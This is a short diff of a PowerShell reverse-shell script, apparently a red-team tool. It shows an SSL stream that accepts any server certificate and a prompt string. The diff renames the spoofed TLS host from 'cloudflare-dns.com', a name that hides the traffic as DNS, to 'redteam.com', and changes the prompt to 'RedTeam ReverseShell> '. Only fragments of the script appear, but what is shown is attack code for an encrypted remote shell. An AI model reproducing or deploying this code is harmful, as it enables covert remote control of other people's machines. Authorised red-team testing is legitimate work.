@@ -9,7 +9,7 @@ $ScriptBlock = {
         try {
             # Create an SSL client with the specified protocols
             $SSLClient = New-Object System.Net.Security.SslStream($TCPClient.GetStream(), $false, { $true })
-            $SSLClient.AuthenticateAsClient('cloudflare-dns.com')
+            $SSLClient.AuthenticateAsClient('redteam.com')
 
             # Check if the SSL stream is successfully encrypted and signed
             if (!$SSLClient.IsEncrypted -or !$SSLClient.IsSigned) {
@@ -22,7 +22,7 @@ $ScriptBlock = {
 
             # Define a function that writes data to the stream
             function WriteToStream($String) {
-                $StreamWriter.WriteLine($String + 'SHELL> ')
+                $StreamWriter.WriteLine($String + 'RedTeam ReverseShell> ')
                 $StreamWriter.Flush()
             }
 
